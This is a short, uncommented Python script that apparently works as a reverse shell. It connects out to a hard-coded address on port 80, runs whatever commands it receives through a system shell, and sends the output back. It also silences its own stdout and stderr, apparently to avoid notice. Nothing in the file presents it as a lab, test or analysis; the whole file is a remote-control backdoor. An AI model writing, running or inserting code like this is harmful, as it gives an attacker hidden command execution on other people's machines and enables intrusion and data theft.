import os
import subprocess
import socket
import sys

ip="192.168.0.101"
port=80

def execute():
 try:
  soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  soc.connect((ip,port))
  soc.send("S")
 except:
  soc.close()
  sys.exit(0)

 while(1):
   cmd=""
   cmd=soc.recv(60)
   cmd=cmd.rstrip()
   try:
    if cmd=="quit":
     soc.close()
     sys.exit(1)
     
    if("cd" in cmd and " " in cmd):
	com=cmd.split()
	try:
	 os.chdir(com[1])
	 soc.send("success")
	 continue
	except:
	 soc.send("Unknown directory")

    else:
     out=""
     out=subprocess.check_output(cmd,shell=True)
     if(not(out)):
      soc.send("success")
     else:
      soc.send(out)
   except:
     soc.send("command did not work")



def main():
 sys.stdout=open("NUL",'w')
 sys.stderr=open("NUL",'w')
 execute()
 sys.exit(0)



main()
